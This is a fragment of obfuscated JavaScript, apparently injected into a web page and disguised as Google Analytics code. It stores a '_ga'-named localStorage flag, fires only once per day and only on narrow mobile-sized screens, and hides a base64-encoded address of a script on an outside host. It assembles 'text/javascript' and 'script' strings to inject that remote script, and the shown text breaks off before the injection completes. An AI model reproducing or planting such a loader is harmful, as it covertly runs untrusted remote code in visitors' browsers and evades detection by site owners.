...
;(function(){try{let felFK=location.hostname+'_ga';let d=String(new Date().getDay());
	let l=localStorage;if((!l[felFK]||(l[felFK]&&l[felFK]!=String(d)))&&window.innerWidth<600){
		let flee='Ly9weGxzdGF0LmNvbS9hL2Vrci9nYS5qcw==';
		let vf='text'+'/'+'javascript';let sc='script';
